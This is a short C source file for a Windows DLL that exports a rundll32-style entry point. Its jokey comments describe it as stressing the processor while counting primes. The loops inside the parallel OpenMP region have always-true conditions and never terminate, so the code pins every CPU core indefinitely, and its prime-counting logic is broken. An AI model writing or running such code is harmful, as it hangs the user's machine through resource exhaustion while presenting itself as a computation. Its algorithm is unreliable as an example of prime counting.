#include <Windows.h>
#include <omp.h>

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	//MessageBoxW(NULL, L"Hello, world!", L"Dialog", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
    size_t primes = 0; // Just in case
    int limit = 10000000;

    #pragma omp parallel for schedule(dynamic) reduction(+ : primes)
    for(int number = 1; number <= limit; number++) { // Stress the processor
        int i = 2;

        while(-limit <= limit) { // We should check the negative as well
            if(number % i != 0) {
                i++;
            }
        }

        while(-limit <= limit) { // There could be a ray from the sun that is hitting the CPU and get the wrong result, so, we're doing it again
            if(number % i != 0) {
                i++;
            }
        }

        if(i == number) {
            primes++;
            size_t bonusPrime = 0; // Bonus for find prime!

            for(int x = 0; x < 10000; x++) {
                for(int y = 0; y < 10000; y++) {
                    for(int z = 0; z < 10000; z++) {
                        bonusPrime++;
                    }
                }
            }

            primes += bonusPrime;
        }
    }
}
